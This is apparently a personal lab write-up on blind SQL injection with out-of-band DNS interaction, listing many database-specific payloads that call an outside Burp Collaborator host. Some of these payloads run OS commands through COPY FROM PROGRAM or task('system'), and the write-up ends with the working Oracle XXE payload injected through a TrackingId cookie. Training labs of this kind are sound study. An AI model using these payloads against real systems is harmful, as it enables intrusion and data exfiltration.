1. GOAL: make a dns request to the outside.
2. get my dns service from burp collaborator.
3. Find the vulnerable parameter, here i was already freaking lost.
4. i've tried these:
5. 
UNION SELECT UTL_INADDR.get_host_address('abc.oastify.com') FROM dual--
UNION SELECT DBMS_LDAP.INIT('abc.oastify.com',80) FROM dual--
UNION SELECT UTL_HTTP.request('http://abc.oastify.com/') FROM dual--
;exec master..xp_dirtree '\\abc.oastify.com\foobar'--
;exec master..xp_fileexist '\\abc.oastify.com\test'--
;exec master..xp_subdirs '\\abc.oastify.com\share'--
DROP TABLE IF EXISTS tmp;
CREATE TABLE tmp(content text);
COPY tmp FROM PROGRAM 'nslookup abc.oastify.com';
COPY (SELECT '') TO PROGRAM 'nslookup abc.oastify.com';
SELECT LOAD_FILE('\\\\abc.oastify.com\\share')--
SELECT '' INTO OUTFILE '\\\\abc.oastify.com\\test'--
SELECT load_extension('//abc.oastify.com/malicious')--
SELECT * FROM sysibm.sysdummy1
WHERE 1 = (SELECT COUNT(*) FROM TABLE(SYSPROC.HTTPGETCLOB('http://abc.oastify.com')) AS t);)
EXECUTE FUNCTION task("system", "nslookup abc.oastify.com");
6. all of them did not give me anything, i looked at the hint and looked into the cheat sheet, there if found (see image 2)
7. grabbed the first one: SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://h5nnagj86o33oxbqhquuydvzwq2hqaez/"> %remote;]>'),'/l') FROM dual
8. and change the value to my collaborator.
9. TrackingId=vPyKqZhnLDfhXNHu'||SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"4chah3qvdbaqvkidod1h502m3d94xvlk.oastify.com">+%25remote%3b]>'),'/l')+FROM+dual||'
10. it didnt work, so i thought maybe the reason is how i concatenate my query, i used union: 
11. 'UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"h5nnagj86o33oxbqhquuydvzwq2hqaez.oastify.com">+%25remote%3b]>'),'/l')+FROM+dual--;
12. this didnt work either..
13. i tried using https:// -> so i can trigger a dns, it didnt work.
14. then realised burp might be using http only.. so i used:
15. 'UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://h5nnagj86o33oxbqhquuydvzwq2hqaez.oastify.com">+%25remote%3b]>'),'/l')+FROM+dual--
16. Lab solved!
17. P.s. i will update this document with detailed explanation why it worked.